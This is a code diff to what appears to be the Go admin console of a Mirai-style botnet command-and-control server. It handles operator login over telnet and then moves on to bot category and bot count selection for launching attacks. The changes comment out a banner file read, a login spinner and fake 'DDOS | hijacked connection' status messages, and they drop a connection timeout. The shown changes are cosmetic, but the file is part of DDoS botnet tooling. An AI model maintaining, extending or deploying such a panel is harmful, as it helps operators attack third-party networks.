@@ -5,7 +5,7 @@ import (
     "net"
     "time"
     "strings"
-    "io/ioutil"
+    //"io/ioutil"
     "strconv"
 )
 
@@ -25,13 +25,13 @@ func (this *Admin) Handle() {
         this.conn.Write([]byte("\033[?1049l"))
     }()
 
-    headerb, err := ioutil.ReadFile("prompt.txt")
-    if err != nil {
-        return
-    }
+    //headerb, err := ioutil.ReadFile("prompt.txt")
+    //if err != nil {
+    //    return
+    //}
 
-    header := string(headerb)
-    this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))
+    //header := string(headerb)
+    //this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))
 
     // Get username
     this.conn.SetDeadline(time.Now().Add(60 * time.Second))
@@ -49,13 +49,17 @@ func (this *Admin) Handle() {
         return
     }
 
-    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
+    this.conn.SetDeadline(time.Time{})
     this.conn.Write([]byte("\r\n"))
-    spinBuf := []byte{'-', '\\', '|', '/'}
-    for i := 0; i < 15; i++ {
-        this.conn.Write(append([]byte("\r\033[37;1mLogging in... \033[31m"), spinBuf[i % len(spinBuf)]))
-        time.Sleep(time.Duration(300) * time.Millisecond)
-    }
+    this.conn.Write([]byte("\r\033[37;1mLogging in... \033[31m\r\n"))
+
+    //this.conn.SetDeadline(time.Now().Add(120 * time.Second))
+    //this.conn.Write([]byte("\r\n"))
+    //spinBuf := []byte{'-', '\\', '|', '/'}
+    //for i := 0; i < 15; i++ {
+    //    this.conn.Write(append([]byte("\r\033[37;1mLogging in... \033[31m"), spinBuf[i % len(spinBuf)]))
+    //    time.Sleep(time.Duration(300) * time.Millisecond)
+    //}
 
     var loggedIn bool
     var userInfo AccountInfo
@@ -67,20 +71,20 @@ func (this *Admin) Handle() {
         return
     }
 
-    this.conn.Write([]byte("\r\n\033[0m"))
-    this.conn.Write([]byte("[+] DDOS | Succesfully hijacked connection\r\n"))
-    time.Sleep(250 * time.Millisecond)
-    this.conn.Write([]byte("[+] DDOS | Masking connection from utmp+wtmp...\r\n"))
-    time.Sleep(500 * time.Millisecond)
-    this.conn.Write([]byte("[+] DDOS | Hiding from netstat...\r\n"))
-    time.Sleep(150 * time.Millisecond)
-    this.conn.Write([]byte("[+] DDOS | Removing all traces of LD_PRELOAD...\r\n"))
-    for i := 0; i < 4; i++ {
-        time.Sleep(100 * time.Millisecond)
-        this.conn.Write([]byte(fmt.Sprintf("[+] DDOS | Wiping env libc.poison.so.%d\r\n", i + 1)))
-    }
-    this.conn.Write([]byte("[+] DDOS | Setting up virtual terminal...\r\n"))
-    time.Sleep(1 * time.Second)
+    //this.conn.Write([]byte("\r\n\033[0m"))
+    //this.conn.Write([]byte("[+] DDOS | Succesfully hijacked connection\r\n"))
+    //time.Sleep(250 * time.Millisecond)
+    //this.conn.Write([]byte("[+] DDOS | Masking connection from utmp+wtmp...\r\n"))
+    //time.Sleep(500 * time.Millisecond)
+    //this.conn.Write([]byte("[+] DDOS | Hiding from netstat...\r\n"))
+    //time.Sleep(150 * time.Millisecond)
+    //this.conn.Write([]byte("[+] DDOS | Removing all traces of LD_PRELOAD...\r\n"))
+    //for i := 0; i < 4; i++ {
+    //    time.Sleep(100 * time.Millisecond)
+    //    this.conn.Write([]byte(fmt.Sprintf("[+] DDOS | Wiping env libc.poison.so.%d\r\n", i + 1)))
+    //}
+    //this.conn.Write([]byte("[+] DDOS | Setting up virtual terminal...\r\n"))
+    //time.Sleep(1 * time.Second)
 
     go func() {
         i := 0
@@ -104,7 +108,7 @@ func (this *Admin) Handle() {
         }
     }()
 
-    this.conn.Write([]byte("\033[37;1m[!] Sharing access IS prohibited!\r\n[!] Do NOT share your credentials!\r\n\033[36;1mReady\r\n"))
+    //this.conn.Write([]byte("\033[37;1m[!] Sharing access IS prohibited!\r\n[!] Do NOT share your credentials!\r\n\033[36;1mReady\r\n"))
     for {
         var botCatagory string
         var botCount int
